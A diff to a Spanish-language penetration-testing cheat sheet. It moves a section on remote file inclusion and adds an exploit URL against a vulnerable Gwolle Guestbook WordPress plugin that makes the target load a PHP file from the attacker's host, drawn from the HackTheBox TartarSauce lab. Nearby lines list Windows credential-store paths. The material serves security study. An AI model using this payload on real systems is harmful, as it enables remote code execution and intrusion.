@@ -35,9 +35,9 @@
        * [Squid Proxy](#squid-proxy)
      * [Pentesting Web](#pentesting-web)
        * [LFI (Local File Inclusion)](#lfi)
+       * [RFI (Remote File Inclusion)](#lfi)
        * [LFI to RCE](#lfi-to-rce)
        * [LFI to RCE via PHP Sessions](#lfi-to-rce-via-php-sessions)
-       * [RFI (Remote File Inclusion)](#rfi)  
        * [LFI RFI using Wrappers](#lfi-rfi-using-wrappers) 
        * [SQLI (SQL Inyection)](#sqli)     
        * [Shellshock](#shellshock)
@@ -1699,6 +1699,17 @@ windows\repair\SAM
 %SYSTEMROOT%\System32\config\RegBack\system
 ```
 
+#### RFI
+
+Esta vulnerabilidad tiene cierta similitud que el LFI, sólo que la inclusión de archivos se produce de manera remota, permitiéndonos desde la URL vulnerable de un servicio web apuntar hacia servicios locales de nuestro equipo que estemos compartiendo.
+
+Un buen ejemplo para practicar es la máquina **TartarSauce** de HackTheBox, donde el servicio web contaba con un plugin Gwolle vulnerable a RFI. Desde el servicio web, realizábamos la siguiente consulta desde la URL:
+
+`http://192.168.1.X/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abs
+path=http://nuestraIP/wp-load.php`
+
+De esta forma, resulta sencillo pensar en lo fácil que puede llegar a ser para el caso descrito el acceso al sistema.
+
 #### LFI to RCE
 
 Existen varias formas de conseguir ejecutar comandos en remoto a través de un **Local File Inclusion**, así como de acceder al sistema a través de la visualización de ciertos recursos. Para este caso, explicaré 2 técnicas a modo de ejemplo:
@@ -1731,18 +1742,9 @@ Siempre suelo emplear Burpsuite como intermediario, pero también se puede hacer
 
 Otra de las técnicas para conseguir la ejecución de comandos a través de un **LFI** es por medio de archivos **proc**. Podemos encontrar la metodología paso a paso en el [siguiente recurso](https://www.exploit-db.com/papers/12992/).
 
-Esta vulnerabilidad tiene cierta similitud que el LFI, sólo que la inclusión de archivos se produce de manera remota, permitiéndonos desde la URL vulnerable de un servicio web apuntar hacia servicios locales de nuestro equipo que estemos compartiendo.
-
-Un buen ejemplo para practicar es la máquina **TartarSauce** de HackTheBox, donde el servicio web contaba con un plugin Gwolle vulnerable a RFI. Desde el servicio web, realizábamos la siguiente consulta desde la URL:
-
-`http://192.168.1.X/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abs
-path=http://nuestraIP/wp-load.php`
-
-De esta forma, resulta sencillo pensar en lo fácil que puede llegar a ser para el caso descrito el acceso al sistema.
-
 #### LFI to RCE via PHP Sessions
 
-
+Para este caso, comprobamos
 
 #### SQLI
 
